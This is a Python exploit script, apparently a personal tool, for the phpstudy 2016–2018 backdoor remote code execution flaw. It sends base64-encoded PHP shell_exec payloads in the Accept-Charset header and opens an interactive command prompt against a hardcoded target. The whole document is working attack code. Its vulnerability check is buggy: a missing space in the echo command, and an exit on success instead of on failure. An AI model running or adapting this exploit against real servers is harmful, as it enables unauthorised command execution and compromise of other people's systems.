# 利用phpstudy2016-2018的RCE漏洞

import base64
import string
import requests
import sys
import random

url = "http://192.168.109.100/phpinfo.php"
banner = """
EEEEEEE XX    XX PPPPPP  
EE       XX  XX  PP   PP 
EEEEE     XXXX   PPPPPP  
EE       XX  XX  PP      
EEEEEEE XX    XX PP   

                                By Da1NtY

Usage: python3 *.py http://192.168.109.100/phpinfo.php
-------------------------------------------------


"""

def cmd_attack(url,cmd):
    cmd=base64.b64encode(f"print(shell_exec('{cmd}'));".encode())

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Charset": cmd
    }
    res = requests.get(url, headers=headers)

    html = res.content.decode('gb2312')

    result = html[0:html.index("<!DOCTYPE html")].strip()

    return result
def random_str():
    char_list = string.printable.strip()
    random_s = ""

    for i in range(8):
        char = random.choice(char_list)
        random_s += char

    return random_s
def check_vuln(url):
    random_s = random_str()
    cmd =f"echo{random_s}"

    if random_s in cmd_attack(url,cmd):
        return True
    else:
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(banner)
    url = "http://192.168.109.100/phpinfo.php"
    if check_vuln(url):
        exit()

    act = input("Do you want to continue? [y/n] ")
    if act =="n":
        exit()
    while True:
        cmd = input("->")
        if cmd == "exit":
            break
        print(cmd_attack(url,cmd))